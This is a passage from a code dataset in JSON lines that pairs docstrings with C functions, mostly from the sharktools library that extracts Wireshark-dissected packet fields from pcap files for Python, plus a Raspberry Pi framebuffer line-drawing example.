finfo.smem_len;\n    fbp = (char*)mmap(0, \n              screensize, \n              PROT_READ | PROT_WRITE, \n              MAP_SHARED, \n              fbfd, \n              0);\n\n    // open a char device file used for communicating with kernel mbox driver\n    mboxfd = open(DEVICE_FILE_NAME, 0);\n    if (mboxfd < 0) {\n        printf(\"Can't open device file: %s\\n\", DEVICE_FILE_NAME);\n        printf(\"Try creating a device file with: mknod %s c %d 0\\n\", DEVICE_FILE_NAME, MAJOR_NUM);\n        \n    }\n\n    if ((int)fbp == -1) {\n        printf(\"Failed to mmap\\n\");\n    }\n    else if (mboxfd < 0) {\n    }\n    else {\n        // draw...\n        draw();\n        //sleep(5);\n    }\n\n    // cleanup\n    // unmap fb file from memory\n    munmap(fbp, screensize);\n    // reset cursor\n    if (kbfd >= 0) {\n        ioctl(kbfd, KDSETMODE, KD_TEXT);\n        // close kb file\n        close(kbfd);\n    }\n    // reset the display mode\n    if (ioctl(fbfd, FBIOPUT_VSCREENINFO, &orig_vinfo)) {\n        printf(\"Error re-setting variable information.\\n\");\n    }\n    // close fb file    \n    close(fbfd);\n\n    return 0;\n  \n}", "path": "fb\\fbtestXIII.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "// helper function to draw a line in given color\n// (uses Bresenham's line algorithm)\n", "func_signal": "void draw_line(int x0, int y0, int x1, int y1, int c)", "code": "{\n    int dx = x1 - x0;\n    dx = (dx >= 0) ? dx : -dx; // abs()\n    int dy = y1 - y0;\n    dy = (dy >= 0) ? dy : -dy; // abs()\n    int sx;\n    int sy;\n    if (x0 < x1)\n        sx = 1;\n    else\n        sx = -1;\n    if (y0 < y1)\n        sy = 1;\n    else\n        sy = -1;\n    int err = dx - dy;\n    int e2;\n    int done = 0;\n    while (!done) {\n        put_pixel(x0, y0, c);\n        if ((x0 == x1) && (y0 == y1))\n            done = 1;\n        else {\n            e2 = 2 * err;\n            if (e2 > -dy) {\n                err = err - dy;\n                x0 = x0 + sx;\n            }\n            if (e2 < dx) {\n                err = err + dx;\n                y0 = y0 + sy;\n            }\n        }\n    }\n}", "path": "fb\\fbtestXX.c", "repo_name": "rst-/raspberry-compote", "stars": 86, "license": "other", "language": "c", "size": 11958}
{"docstring": "/**\n * This function is called for each node on the dissector tree, for a each packet,\n * First, this function sees if this node is one of the keys (e.g. 'frame.number')\n * we are looking for (nodes store the key in PITEM_FINFO(node)->hfinfo->abbrev).\n * If we found an appropriate field, copy the native value or string representation\n * of the value as appropriate.\n * \n * Finally, recurse on child nodes.\n */\n", "func_signal": "static void proto_tree_get_node_field_values(proto_node *node, gpointer data)", "code": "{\n  stdata_edt_tuple_t *args = data;\n  st_data_t *stdata = args->stdata;\n  field_info\t*fi;\n  gpointer field_index;\n  gpointer orig_key;\n  gboolean key_found;\n  gboolean is_wildcard_field = FALSE;\n\n  fi = PITEM_FINFO(node);\n\n  const gchar *key_str = fi->hfinfo->abbrev;  // e.g. char* that has, e.g., \"ip.dst\" or \"frame.number\"\n  gpointer key = (gpointer)key_str;\n  gulong type = fi->hfinfo->type;     // e.g. int that has, e.g., FT_UINT32 or FT_DOUBLE\n\n  key_found = g_hash_table_lookup_extended(stdata->field_indicies,\n                                           key,\n                                           &orig_key,\n                                           &field_index);\n  \n  if(!key_found)\n    {\n      // Look to see if the current field name matches any wildcards we have\n      gint i;\n      GPtrArray *wfieldnames = stdata->wfieldnames;\n      for(i = 0; i < wfieldnames->len; i++)\n        {\n          if(g_str_has_prefix(key, g_ptr_array_index(wfieldnames, i)))\n            {\n              // Key found!\n              key_found = TRUE;\n              is_wildcard_field = TRUE;\n              break;\n            }\n        }\n    }\n  \n  gchar* val_str;\n  gulong actual_index = (gulong)(field_index);\n\n  if(key_found)\n    {\n      GPtrArray *values = NULL;\n\n      dprintf(\"fi->hfinfo->abbrev = %s\\n\", fi->hfinfo->abbrev);\n\n      /*\n        XXX needs cleanup\n        NB: wildcard and non-wildcard values and types get stored differently; each non-wildcard\n        value/type get stored in arrays, wildcard value/type entries in hashtables.\n        This is done for efficiency; hashing keys can get expensive - why bother hashing if\n        we know the keys already (in the non-wildcard case)\n        This next if/else block takes care of providing a \"common\" access mechanism to the\n        values array.  Type access must be done manually.\n      */\n      if(is_wildcard_field)\n        {\n          values = g_hash_table_lookup(stdata->wtree_values, key);\n          if(!values)\n            {\n              values = g_ptr_array_new();\n              g_hash_table_insert(stdata->wtree_values, key, values);\n              \n              // NB: Assume all values have the same type; we set this on the first entry\n              // dprintf(\"ty2pe: %d\\n\", type);\n\n              // NB: type (a gulong) is being cast as a gpointer here.  This assumes\n              // that gulongs are smaller-than or equal-to the size of gpointers.\n              g_hash_table_insert(stdata->wtree_types, key, (gpointer)type);\n            }\n        }\n      else\n        {\n          values = g_ptr_array_index(stdata->tree_values, actual_index);\n\n          // NB: non-wildcard field type info is handled later in this fn...\n        }\n      \n      if(type == FT_STRING)\n        {\n          dprintf(\"found a string!\\n\");\n          dprintf(\"string is: %s\\n\", (char*)fvalue_get(&(fi->value)));\n          dprintf(\"string as gnfvas: %s\\n\", get_node_field_value_as_string(fi, args->edt));\n\n          val_str = (gchar *)get_node_field_value_as_string(fi, args->edt);\n          stdata->field_types[actual_index] = type;\n\n          g_ptr_array_add(values, val_str);\n        }\n      else if(type == FT_NONE)\n        {\n          gulong tmp_type = FT_NONE;\n\n          //check repr\n          if(  fi->rep ){\n            val_str = g_strdup( fi->rep->representation );\n\n            g_ptr_array_add(values, val_str);\n            \n            tmp_type = FT_STRING;\n          }\n\n          if(is_wildcard_field)\n            {\n              //XXX CLEANUP\n              //gulong *tmp2 = g_new0(gulong, 1);\n              //*tmp2 = tmp_type;\n              // NB: overwrite the previous value\n              g_hash_table_insert(stdata->wtree_types, key, (gpointer)tmp_type);\n            }\n          else\n            {\n              stdata->field_types[actual_index] = tmp_type;\n              ////g_array_insert_val(stdata->tree_types, actual_index, tmp_type);\n            }\n        }\n      else if(is_native_type(type) == TRUE)\n        {\n          fvalue_t* tmp = g_new(fvalue_t,1);\n          memcpy(tmp, &(fi->value), sizeof(fvalue_t));\n          \n          g_ptr_array_add(values, tmp);\n\n          if(is_wildcard_field)\n            {\n              // already taken care of...\n            }\n          else\n            {\n              // If we can natively store the type,\n              // do that and don't convert to a string\n              stdata->field_types[actual_index] = type;\n              ////g_array_insert_val(stdata->tree_types, actual_index, type);\n            }\n        }\n      else\n        {\n          // As a last ditch options, convert the value to a string,\n          // and don't bother storing the native type\n          val_str = (gchar *)get_node_field_value_as_string(fi, args->edt);\n          if(strlen(val_str) > 0)\n            {\n              if(is_wildcard_field)\n                {\n                  g_hash_table_insert(stdata->wtree_types, key, (gpointer)FT_STRING);\n                }\n              else\n                {\n                  gulong tmp_type = FT_STRING;\n                  stdata->field_types[actual_index] = tmp_type;\n                  ////g_array_insert_val(stdata->tree_types, actual_index, tmp_type);\n                }\n            }\n          else\n            {\n              if(is_wildcard_field)\n                {\n                  g_hash_table_insert(stdata->wtree_types, key, (gpointer)type);\n                }\n              else\n                {\n                  stdata->field_types[actual_index] = type;\n                  ////g_array_insert_val(stdata->tree_types, actual_index, type);\n                }\n            }\n          g_ptr_array_add(values, val_str);\n        }\n    }\n\n  /* Recurse here. */\n  if (node->first_child != NULL)\n    {\n      proto_tree_children_foreach(node,\n\t\t\t\t  proto_tree_get_node_field_values, args);\n    }\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Removes a decode_as string from the wireshark engine\n */\n", "func_signal": "long sharktools_remove_decode_as(char *s)", "code": "{\n  dprintf(\"%s: called\\n\", __FUNCTION__);\n\n  return remove_decode_as(s);\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * XXX: This was added to combat a problem where a dynamic linking error would occur\n * because some wireshark dissectors (i.e. libraries) did not dynamically link to\n * libwireshark and libglib-2.0.so, but required functions in them to be loaded.\n * \n * This is hacky, and this function might not even be necessary in all configurations.\n */\n", "func_signal": "int sharktools_preload_libs(void)", "code": "{\n\n#define LIBWIRESHARK \"libwireshark.so\"\n#define LIBGLIB \"libglib-2.0.so\"\n\n  int ret = 0;\n\n  GModule* handle;\n  handle = g_module_open(LIBWIRESHARK, 0);\n  if(!handle)\n    {\n      dprintf(\"%s\", g_module_error());\n      ret = 1;\n    }\n\n  GModule *handle2;\n  handle2 = g_module_open(LIBGLIB, 0);\n  if(!handle2)\n    {\n      dprintf(\"%s\", g_module_error());\n      ret = 1;\n    }\n\n  // XXX fixme: don't lose the handles and close the dynamic libs later (?)\n  return ret;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Looks up type in the global G_native_types tree\n * \n * @return True or False indication of search\n */\n", "func_signal": "static inline gboolean is_native_type(gulong type)", "code": "{\n  gboolean ret;\n\n  if(G_native_types == NULL)\n    {\n      ret = FALSE;\n    }\n  else\n    {\n      if(g_tree_lookup(G_native_types, (gpointer)type) == NULL)\n        {\n          ret = FALSE;\n        }\n      else\n        {\n          ret = TRUE;\n        }\n    }\n\n  dprintf(\"%s: type = %ld, ret = %d\\n\", __FUNCTION__, type, ret);\n  return ret;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Adds a decode_as string to the wireshark engine\n */\n", "func_signal": "long sharktools_add_decode_as(char *s)", "code": "{\n  dprintf(\"%s: called\\n\", __FUNCTION__);\n\n  /*\n  int status;\n  status = add_decode_as(\"udp.port==60000,aodv\");\n  if(!status)\n    dprintf(\"add_decode_as failed.\\n\");\n  */\n\n  return add_decode_as(s);\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Ideally, this effectively un-does operations in sharktools_init()\n */\n", "func_signal": "int sharktools_cleanup(void)", "code": "{\n  dprintf(\"%s: called\\n\", __FUNCTION__);\n\n  epan_cleanup();\n  return 0;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * This function processes a specified capture file with the specified fields of interest\n * and display filter.  This function calls the appropriate language-specific callback\n * function in <cb> to manipulate data structures in the caller's scope.\n * \n * @param filename valid pcap file\n * @param nfields a positive integer describing the number of fields\n * @param fields an array of strings\n * @return 0 on success, else error.\n */\n", "func_signal": "glong sharktools_get_cb(gchar *filename, gulong nfields, const gchar **fields,\n                       gchar *dfilterorig, sharktools_callbacks *cb)", "code": "{\n  gsize i;\n  capture_file cfile;\n  gchar *cf_name = NULL;\n  char *dfilter;\n  dfilter_t *rfcode = NULL;\n\n  // Create an stdata struct on the stack\n  st_data_t stdata;\n\n  dprintf(\"%s: entering...\\n\", __FUNCTION__);\n\n  dprintf(\"%s: dfilterorig: %s\\n\", __FUNCTION__, dfilterorig);\n\n  dfilter = strdup(dfilterorig);\n\n  dprintf(\"%s: dfilter: %s\\n\", __FUNCTION__, dfilter);\n\n  if(!dfilter_compile(dfilter, &rfcode))\n    {\n      sprintf(errmsg, \"%s\", dfilter_error_msg);\n      printf(\"errmsg\");\n      if(rfcode)\n        dfilter_free(rfcode);\n      return -1;\n    }\n\n  // Defined in cfile.c, looks easy enough to use\n  cap_file_init(&cfile);\n\n  cf_name = filename;\n\n  // Open pcap file\n  int err;\n  if(cf_open(&cfile, cf_name, FALSE, &err) != CF_OK)\n    {\n      //sprintf(errmsg, \"%s\", dfilter_error_msg);\n      if(rfcode)\n        dfilter_free(rfcode);\n      return -1;\n    }\n\n  dprintf(\"nfields = %ld\\n\", nfields);\n\n  stdata_init_old(&stdata, nfields);\n\n  stdata_add_fields(&stdata, fields, nfields);\n\n  dprintf(\"stdata.fieldnames->len = %d\\n\", stdata.fieldnames->len);\n\n  dprintf(\"stdata.field_types = %p\\n\", stdata.field_types);\n  \n  dprintf(\"%s: opened file\\n\", __FUNCTION__);\n\n  cfile.rfcode = rfcode;\n\n  gchar        *err_info;\n  gint64       data_offset;\n\n  // Read and process each packet one at a time\n  while(wtap_read(cfile.wth, &err, &err_info, &data_offset))\n    {\n      //dprintf(\"*******************************\\n\");\n\n      // (Re)-set all the stdata.field_{values,types} fields\n      for(i = 0; i < nfields; i++)\n        {\n          stdata.field_types[i] = FT_NONE;\n        }\n\n      gboolean passed = FALSE;\n      \n      passed = process_packet(&cfile, data_offset, &stdata);\n\n      if(passed)\n\t{\n          gpointer row = cb->row_new(cb);\n\n\t  for(i = 0; i < nfields; i++)\n\t    {\n              gpointer key;\n              key = cb->keys[i];\n\n              //dprintf(\"key = %p\\n\", key);\n\n\t      //dprintf(\"types[%ld] = %ld\\n\", i, stdata.field_types[i]);\n\n              cb->row_set(cb, row, key,\n                          stdata.field_types[i],\n                          g_ptr_array_index( stdata.tree_values, i)\n                          );\n            }\n\n          cb->row_add(cb, row);\n          //reset tree_values\n          g_ptr_array_free( stdata.tree_values, TRUE);\n          stdata.tree_values = g_ptr_array_new();\n          for(i = 0; i < nfields; i++)\n            {\n              g_ptr_array_add( stdata.tree_values, g_ptr_array_new() );\n            }\n\n        }\n    }\n\n  if(rfcode)\n    dfilter_free(rfcode);\n  wtap_close(cfile.wth);\n  cfile.wth = NULL;\n\n  stdata_cleanup(&stdata);\n\n  dprintf(\"%s: ...leaving.\\n\", __FUNCTION__);\n\n  return 0;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/*\n * Write errors are reported with an console message in Sharktools.\n */\n", "func_signal": "static void\nwrite_failure_message(const char *filename, int err)", "code": "{\n  dprintf(\"An error occurred while writing to the file \\\"%s\\\": %s.\",\n          filename, strerror(err));\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Here we cleanup stdata by deallocating it's members in reverse order of\n * allocation.\n */\n", "func_signal": "static void\nstdata_cleanup(st_data_t* stdata)", "code": "{\n  gsize i;\n\n  g_assert(stdata);\n  \n  ////if(stdata->tree_types)\n    ////g_array_free(stdata->tree_types, FALSE);\n\n  if(stdata->field_types)\n    g_free(stdata->field_types);\n\n\n  if(stdata->tree_values)\n    {\n      for(i = 0; i < stdata->fieldnames->len; i++)\n        {\n          g_ptr_array_free( g_ptr_array_index(stdata->tree_values, i), TRUE);\n        }\n      g_ptr_array_free( stdata->tree_values, TRUE);\n    }\n\n  if(stdata->field_indicies)\n    {\n      /* Keys are stored in stdata->fields, values are\n       * integers.\n       */\n      g_hash_table_destroy(stdata->field_indicies);\n    }\n\n\n  /*\n  for(i = 0; i < stdata->fields->len; ++i)\n    {\n      gchar* field = g_ptr_array_index(stdata->fields,i);\n      g_free(field);\n    }\n  */\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Sharktools Initialization\n * \n * This function will subsequently initialize Wireshark and associated mechanisms.\n */\n", "func_signal": "int sharktools_init(void)", "code": "{\n  // NOTE: VERSION is a #define from config.h.  examples: \"0.99.7\" or \"1.0.8\"\n  if(strcmp(epan_get_version(), VERSION)) {\n    printf(\"ERROR: sharktools was compiled using version %s of libwireshark.\\n\", VERSION);\n    printf(\"However, the libwireshark installed on this system is version %s.\\n\", epan_get_version());\n    printf(\"Please recompile sharktools with headers from libwireshark version %s,\\n\", epan_get_version());\n    printf(\"or modify LD_LIBRARY_PATH to point to version %s of libwireshark.\\n\", VERSION);\n    printf(\"Consult sharktools' README file for more information on using a different version of libwireshark.\\n\");\n    return -1;\n  }\n\n  // FIXME: Hacky; see note above.\n  sharktools_preload_libs();\n\n  /*\n   * Get credential information for later use.\n   */\n#if (WIRESHARK_1_0_0 || WIRESHARK_1_2_0 || WIRESHARK_1_4_0)\n  get_credential_info();\n#elif defined(WIRESHARK_1_6_0) || defined(WIRESHARK_1_8_0) || defined(WIRESHARK_1_10_0)\n  init_process_policies();\n#endif\n  \n  dprintf(\"%s: initializing...\\n\", __FUNCTION__);\n  \n#if WIRESHARK_0_99_5\n  epan_init(register_all_protocols, register_all_protocol_handoffs,\n            failure_message, open_failure_message, read_failure_message);\n#elif WIRESHARK_1_0_0\n  epan_init(register_all_protocols, register_all_protocol_handoffs, NULL, NULL,\n            failure_message, open_failure_message, read_failure_message);\n#elif (WIRESHARK_1_2_0 || WIRESHARK_1_4_0 || WIRESHARK_1_6_0 || WIRESHARK_1_8_0 || WIRESHARK_1_10_0)\n  epan_init(register_all_protocols, register_all_protocol_handoffs, NULL, NULL,\n            failure_message, open_failure_message, read_failure_message, write_failure_message);\n#endif\n  \n  //register_all_plugin_tap_listeners();  \n  //register_all_tap_listeners();\n\n  // Set this global variable to NULL\n  G_native_types = NULL;\n  \n  dprintf(\"%s: initialized.\\n\", __FUNCTION__);\n\n  return 0;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/* Returns an ep_alloced string or a static constant*/\n", "func_signal": "static const gchar* get_node_field_value_as_string(field_info* fi, epan_dissect_t* edt)", "code": "{\n  /* Text label. */\n  if (fi->hfinfo->id == hf_text_only)\n    {\n      /* Get the text */\n      if (fi->rep)\n\t{\n\t  return fi->rep->representation;\n\t}\n      else\n\t{\n          // XXX APB do we get here or later in this function?\n\t  return get_field_hex_value2(edt->pi.data_src, fi);\n\t}\n    }\n#if 0\n  /* Uninterpreted data, i.e., the \"Data\" protocol, is\n   * printed as a field instead of a protocol. */\n  else if (fi->hfinfo->id == proto_data)\n    {\n      return get_field_hex_value2(edt->pi.data_src, fi);\n    }\n#endif  \n  /* Normal protocols and fields */\n  else\n    {\n      gchar\t\t*dfilter_string;\n      gint\t\tchop_len;\n      \n      switch (fi->hfinfo->type)\n\t{\n\tcase FT_NONE:\n\t  return NULL;\n\tcase FT_PROTOCOL:\n\t  /* Print out the full details for the protocol. */\n\t  if (fi->rep)\n\t    {\n\t      return fi->rep->representation;\n\t    }\n\t  else\n\t    {\n\t      /* Just print out the protocol abbreviation */\n\t      //return fi->hfinfo->abbrev;;\n        /* HACK - get the hex values - more useful than the abbrev */\n\t      return get_field_hex_value2(edt->pi.data_src, fi);\n\t    }\n\tdefault:\n\t  /* XXX - this is a hack until we can just call\n\t   * fvalue_to_string_repr() for *all* FT_* types. */\n\t  dfilter_string = proto_construct_match_selected_string(fi,\n\t\t\t\t\t\t\t\t edt);\n\t  if (dfilter_string != NULL)\n\t    {\n\t      chop_len = strlen(fi->hfinfo->abbrev) + 4; /* for \" == \" */\n\t      \n\t      /* XXX - Remove double-quotes. Again, once we\n\t       * can call fvalue_to_string_repr(), we can\n\t       * ask it not to produce the version for\n\t       * display-filters, and thus, no\n\t       * double-quotes. */\n\t      if (dfilter_string[strlen(dfilter_string)-1] == '\"')\n\t\t{\n\t\t  dfilter_string[strlen(dfilter_string)-1] = '\\0';\n\t\t  chop_len++;\n\t\t}\n\t      \n\t      return &(dfilter_string[chop_len]);\n\t    }\n\t  else\n\t    {\n\t      return get_field_hex_value2(edt->pi.data_src, fi);\n\t    }\n\t}\n    }\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/* this function should be unnecessary - we don't want to convert values to hex. */\n", "func_signal": "static const gchar* get_field_hex_value2(GSList* src_list, field_info *fi)", "code": "{\n  const guint8 *pd;\n  \n  if (fi->length > tvb_length_remaining(fi->ds_tvb, fi->start))\n    {\n      return \"field length invalid!\";\n    }\n  \n  /* Find the data for this field. */\n  pd = get_field_data(src_list, fi);\n  \n  if (pd)\n    {\n      int i;\n      gchar* buffer;\n      gchar* p;\n      int len;\n      const int chars_per_byte = 2;\n      \n      len = chars_per_byte * fi->length;\n      buffer = ep_alloc_array(gchar, len + 1);\n      buffer[len] = '\\0'; /* Ensure NULL termination in bad cases */\n      p = buffer;\n      /* Print a simple hex dump */\n      for (i = 0 ; i < fi->length; i++)\n\t{\n\t  g_snprintf(p, len, \"%02x\", pd[i]);\n\t  p += chars_per_byte;\n\t  len -= chars_per_byte;\n\t}\n      return buffer;\n    }\n  else\n    {\n      return NULL;\n    }\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * This function gets all field values for a packet.  It does this by\n * Creating a data structure to pass to libwireshark's\n * proto_tree_children_foreach(), which subsequently recursively traverses\n * the dissector tree.\n *\n * @param stdata Sharktools data structure,\n * @param edt dissector tree\n */\n", "func_signal": "void proto_tree_get_fields(st_data_t* stdata, epan_dissect_t *edt)", "code": "{\n  g_assert(stdata);\n  g_assert(edt);\n  \n  stdata_edt_tuple_t arg;\n  arg.stdata = stdata;\n  arg.edt = edt;  \n  \n  proto_tree_children_foreach(edt->tree,\n                              proto_tree_get_node_field_values,\n\t\t\t      &arg);\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/*\n * Open/create errors are reported with an console message in Sharktools.\n */\n", "func_signal": "static void open_failure_message(const char *filename, int err, gboolean for_writing)", "code": "{\n  dprintf(\"sharktools: open error\");\n  //fprintf(stderr, file_open_error_message(err, FALSE), filename);\n  dprintf(\"\\n\");\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/* Functions to use for languages that natively support iterators (e.g. Python) */\n", "func_signal": "glong\nsharktools_iter_init(st_data_t *stdata, gchar *filename, const gchar *dfilter)", "code": "{\n  gchar *cf_name = NULL;\n  dfilter_t *rfcode = NULL;\n  capture_file *cf;\n\n\n#ifdef WIRESHARK_1_10_0\n  char                *gpf_path, *pf_path;\n  int                  gpf_open_errno, gpf_read_errno;\n  int                  pf_open_errno, pf_read_errno;\n#endif\n\n\n  dprintf(\"%s: entering...\\n\", __FUNCTION__);\n\n  stdata_init(stdata);\n\n  compute_hashes_from_fieldnames(stdata->field_indicies, stdata->fieldnames);\n\n  dprintf(\"stdata->fieldnames->len = %d\\n\", stdata->fieldnames->len);\n\n  dprintf(\"stdata->field_types = %p\\n\", stdata->field_types);\n  \n  dprintf(\"%s: dfilter: %s\\n\", __FUNCTION__, dfilter);\n\n  if(!dfilter_compile(dfilter, &rfcode)) {\n    sprintf(errmsg, \"%s\", dfilter_error_msg);\n    if(rfcode)\n      dfilter_free(rfcode);\n    return -1;\n  }\n\n  cf = &(stdata->cfile);\n\n  /* Defined in cfile.c, looks easy enough to use */\n  cap_file_init(cf);\n\n  cf_name = filename;\n\n#ifdef WIRESHARK_1_10_0\n  read_prefs(&gpf_open_errno, &gpf_read_errno, &gpf_path,\n          &pf_open_errno, &pf_read_errno, &pf_path);\n#endif\n\n  /* Open pcap file */\n  int err;\n  if(cf_open(cf, cf_name, FALSE, &err) != CF_OK) {\n    //sprintf(errmsg, \"%s\", dfilter_error_msg);\n    if(rfcode)\n      dfilter_free(rfcode);\n    return -1;\n  }\n\n  /* NB: cap_file_init or cf_open zero out cf->rfcode, so\n     change it after those operations\n  */\n  cf->rfcode = rfcode;\n\n#ifdef WIRESHARK_1_10_0\n  build_column_format_array(&cf->cinfo, stdata->nfields, TRUE);\n#endif\n\n  dprintf(\"%s: opened file\\n\", __FUNCTION__);\n\n  return 0;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/* pyshark_Iter_iter() gets registered as PyTypeObject.tp_iter */\n", "func_signal": "PyObject *\npyshark_Iter_iter(PyObject *self)", "code": "{\n  Py_INCREF(self);\n  return self;\n}", "path": "src\\pyshark.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/* pyshark_Iter_iternext() gets registered as PyTypeObject.tp_iternext */\n", "func_signal": "PyObject *\npyshark_Iter_iternext(PyObject *self)", "code": "{\n  pyshark_Iter *p = (pyshark_Iter *)self;\n\n  // catch access of iterator after last element (i.e. after the iterator has been cleaned up)\n  if (p->stdata == NULL) {\n      PyErr_SetNone(PyExc_StopIteration);\n      return NULL;\n  }\n\n  gboolean pkt_exists = sharktools_iter_next(p->stdata);\n  \n  if(pkt_exists) {\n    PyObject *tmp = pyshark_getDict(p);\n    gsize i;\n    \n    /* Reset tree_values */\n    g_ptr_array_free(p->stdata->tree_values, TRUE);\n    p->stdata->tree_values = g_ptr_array_new();\n    for(i = 0; i < p->stdata->fieldnames->len; i++) {\n        g_ptr_array_add(p->stdata->tree_values, g_ptr_array_new()); \n      }\n    \n    /* Reset wtree_values\n     * Call our helper method to deallocate the pointer arrays that are set\n     * as values in the hash table\n     */\n    g_hash_table_foreach(p->stdata->wtree_values, my_ht_value_ptrarray_free_fn, NULL);\n    \n    g_hash_table_remove_all(p->stdata->wtree_values);\n    \n    return tmp;\n  }\n  else {\n    /* We're done with the iterator, and hence, and {pyshark,sharktools}-specific\n     * data, so run the cleanup routine.\n     * \n     * NB: We also call this in pyshark_Iter_dealloc().\n     * NB: This is called to aggressively remove the decode_as string, if set.\n     */\n    pyshark_iter_cleanup(p);\n    \n    /* Raise a standard StopIteration exception with empty value. */\n    PyErr_SetNone(PyExc_StopIteration);\n    \n    return NULL;\n  }\n}", "path": "src\\pyshark.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * Given a handle on a capture file, and an offset within that file,\n * this function will read a packet and decide if it matches the display\n * filter.  If it does, it calls proto_tree_get_fields() to read specific fields\n * into stdata.\n * \n * @return passed a boolean describing whether the packet matched the filter.\n */\n", "func_signal": "gboolean process_packet(capture_file *cf, gint64 offset, st_data_t *stdata)", "code": "{\n  frame_data fdata;\n  epan_dissect_t edt;\n  gboolean passed;\n\n#ifdef WIRESHARK_1_10_0\n  struct wtap_pkthdr *whdr = wtap_phdr(cf->wth);\n#else\n  const struct wtap_pkthdr *whdr = wtap_phdr(cf->wth);\n  union wtap_pseudo_header *pseudo_header = wtap_pseudoheader(cf->wth);\n#endif\n  const guchar *pd = wtap_buf_ptr(cf->wth);\n\n  /* Count this packet.\n     NB: the frame dissector uses this to determine frame.number\n  */\n  cf->count++;\n\n  frame_data_init(&fdata, cf->count, whdr, offset, cum_bytes);\n\n  /**\n   * Initialize dissector tree\n   */\n  epan_dissect_init(&edt, TRUE, TRUE);\n\n#ifdef WIRESHARK_1_10_0\n  col_custom_prime_edt(&edt, &cf->cinfo);\n  frame_data_set_before_dissect(&fdata, &cf->elapsed_time,\n                                &first_ts, prev_dis, prev_cap);\n#else\n  frame_data_set_before_dissect(&fdata, &cf->elapsed_time,\n                                &first_ts, &prev_dis_ts, &prev_cap_ts);\n#endif\n\n  passed = TRUE;\n\n  // AB: prime the epan_dissect_t with the dfilter.\n  if(cf->rfcode) {\n    epan_dissect_prime_dfilter(&edt, cf->rfcode);\n  }\n\n#ifndef WIRESHARK_1_10_0\n  tap_queue_init(&edt);\n#endif\n\n  /**\n   * Run the dissector on this packet\n   */\n#ifdef WIRESHARK_1_10_0\n  epan_dissect_run_with_taps(&edt, whdr, pd, &fdata, &cf->cinfo);\n#else\n  epan_dissect_run(&edt, pseudo_header, pd, &fdata, NULL);\n#endif\n\n#ifndef WIRESHARK_1_10_0\n  tap_push_tapped_queue(&edt);\n#endif\n  \n  // AB: Run the read filter\n  if(cf->rfcode) {\n    passed = dfilter_apply_edt(cf->rfcode, &edt);\n  }\n  else {\n    passed = TRUE;\n  }\n\n  if(passed) {\n#ifdef WIRESHARK_1_10_0\n    frame_data_set_after_dissect(&fdata, &cum_bytes);\n    prev_dis_frame = fdata;\n    prev_dis = &prev_dis_frame;\n    prev_cap_frame = fdata;\n    prev_cap = &prev_cap_frame;\n#else\n    frame_data_set_after_dissect(&fdata, &cum_bytes, &prev_dis_ts);\n#endif\n    \n    /* stdata could be NULL if we are just counting packets */\n    if(stdata != NULL)\n      proto_tree_get_fields(stdata, &edt);\n  }\n\n  epan_dissect_cleanup(&edt);\n#ifdef WIRESHARK_1_10_0\n  frame_data_destroy(&fdata);\n#else\n  frame_data_cleanup(&fdata);\n#endif\n\n  return passed;\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
{"docstring": "/**\n * This function adds <fields> to the stdata data structure:  it copies the strings directly,\n * and it sets up the field_indicies hashtable.\n */\n", "func_signal": "static void stdata_add_fields(st_data_t* stdata, const gchar** fields, gsize nfields)", "code": "{\n  gsize i;\n\n  g_assert(stdata);\n  g_assert(fields);\n  \n  for(i = 0; i < nfields; i++)\n    {\n      dprintf(\"adding outputfield: %s\\n\", fields[i]);\n      //stdata_add(&stdata, fields[i]);\n      gchar* field_copy;\n  \n      field_copy = g_strdup(fields[i]);\n  \n      // Add to fields\n      g_ptr_array_add(stdata->fieldnames, field_copy);\n\n      // Add to hashtable\n      g_hash_table_insert(stdata->field_indicies, field_copy, (gulong *)(i));\n    }\n\n\n#if 0\n  for(i = 0; i < stdata->fields->len; i++)\n    {\n      gchar* field = g_ptr_array_index(stdata->fields, i);\n      g_hash_table_insert(stdata->field_indicies, field, (gulong *)(i));\n    }\n#endif\n\n}", "path": "src\\sharktools_core.c", "repo_name": "armenb/sharktools", "stars": 89, "license": "other", "language": "c", "size": 365}
